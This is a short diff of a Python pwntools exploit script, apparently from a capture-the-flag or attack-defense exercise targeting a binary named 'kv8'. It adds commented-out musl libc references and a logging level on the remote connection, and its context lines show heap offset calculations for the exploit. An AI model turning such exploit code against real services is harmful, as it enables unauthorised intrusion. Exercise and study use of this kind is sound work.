@@ -85,6 +85,8 @@ def exploit(host):
     io = connect(host)
     # exe = ELF("./kv8")
     libc = ELF("./libc.so.6")
+    # libc = ELF("./ld-musl-x86_64.so.1")
+    # ld-musl-x86_64.so.1
     ctx_uid_diff = 0x55612d9b42b0 - 0x55612d9b4260
     # malloc 0 0x55612d9b4260
     # malloc 1 0x55612d9b42b0
@@ -135,7 +137,7 @@ def connect(host):
         if args.LOCAL:
             return process("./kv8")
         else:
-            io = remote(host, PORT)
+            io = remote(host, PORT, level=60)
             return io
     except:
         quit(STATUS_DOWN, "connection failed")
